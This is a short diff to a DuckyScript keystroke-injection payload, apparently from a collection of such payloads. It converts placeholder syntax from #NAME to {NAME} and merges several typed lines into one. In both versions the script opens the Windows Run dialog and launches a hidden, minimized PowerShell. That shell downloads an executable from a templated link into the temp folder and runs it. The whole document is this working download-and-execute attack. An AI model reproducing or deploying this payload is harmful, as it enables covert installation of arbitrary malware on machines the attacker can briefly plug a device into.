@@ -1,10 +1,5 @@
-REM Downloads and executes a windows executable
-DELAY #START_DELAY
+DELAY {START_DELAY}
 GUI r
-DELAY #RUN_DELAY
-STRING cmd /c start /min powershell -w 1 "$r=$env:temp+'/r.exe';curl
-SPACE
-STRING #LINK
-SPACE
-STRING -o $r;&$r"
+DELAY {RUN_DELAY}
+STRING cmd /c start /min powershell -w 1 "$r=$env:temp+'/r.exe';curl {LINK} -o $r;&$r"
 ENTER
